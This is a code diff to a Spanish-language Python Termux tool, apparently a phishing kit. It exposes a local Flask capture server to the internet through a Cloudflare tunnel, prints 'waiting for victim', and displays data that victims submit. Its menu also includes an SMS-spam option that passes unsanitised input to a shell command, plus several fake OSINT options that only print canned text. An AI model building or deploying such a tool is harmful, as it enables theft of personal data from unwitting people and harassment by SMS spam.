@@ -34,11 +34,12 @@ def print_banner():
 
 def main():
     os.system("fuser -k 5000/tcp > /dev/null 2>&1")
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False), daemon=True).start()
+    # Inicia el servidor
+    threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000, debug=False), daemon=True).start()
     
     while True:
         print_banner()
-        print("  [1] RASTREAR NÚMERO | [2] LINK-ZP (MONITOR) | [3] CREADOR")
+        print("  [1] RASTREAR NÚMERO | [2] LINK-ZP (HTTPS) | [3] CREADOR")
         print("  [4] VERSIONES       | [5] ANALIZAR LINK     | [6] ADM SISTEMA")
         print("  [7] INFO            | [8] REPOSITORIO       | [9] PROCESOS")
         print("  [10] SPAM-SMS       | [0] SALIR")
@@ -46,9 +47,14 @@ def main():
 
         if sel == "2":
             os.system('clear')
-            print(f"{C}--- MONITOR DE DATOS EN VIVO ---{W}")
-            print(f"SSH: {Y}ssh -R 80:localhost:5000 ssh.localhost.run{W}")
+            print(f"{C}--- GENERANDO LINK HTTPS SEGURO ---{W}")
+            # Esto lanza el túnel de Cloudflare que genera el HTTPS automáticamente
+            print(f"{G}Copiando dirección pública...{W}")
+            os.system("cloudflared tunnel --url http://localhost:5000 &")
+            time.sleep(5) # Espera a que el túnel conecte
+            print(f"\n{Y}EL LINK HTTPS HA SIDO GENERADO (REVISA LA SALIDA ARRIBA){W}")
             print(f"{G}ESPERANDO VÍCTIMA...{W}")
+            
             while True:
                 time.sleep(2)
                 if os.path.exists(LOG_FILE):
@@ -57,19 +63,16 @@ def main():
                         if lines:
                             os.system('clear')
                             print(f"{G}¡DATOS RECIBIDOS!{W}\n{lines[-1].strip()}")
-                # Sin inputs bloqueantes aquí
+        
         elif sel == "1":
             input("NÚMERO: "); print("BUSCANDO..."); input("ENTER...")
         elif sel == "3": print("CREADOR: OSCAR"); time.sleep(1)
         elif sel == "4": print("VERSIÓN: 1.4.5"); time.sleep(1)
-        elif sel == "5": input("URL: "); print("ANALIZANDO..."); time.sleep(1)
-        elif sel == "6": input("KEY: "); print("SISTEMA ACTIVO"); time.sleep(1)
-        elif sel == "7": print("HERRAMIENTA OSINT"); time.sleep(1)
-        elif sel == "8": print("REPO PRIVADO"); time.sleep(1)
-        elif sel == "9": print("PROCESOS: 1 ACTIVO"); time.sleep(1)
         elif sel == "10": 
             num = input("NÚMERO: "); msg = input("MSG: ")
             os.system(f"termux-sms-send -n {num} '{msg}'")
-        elif sel == "0": sys.exit()
+        elif sel == "0": 
+            os.system("pkill cloudflared")
+            sys.exit()
 
 if __name__ == "__main__": main()
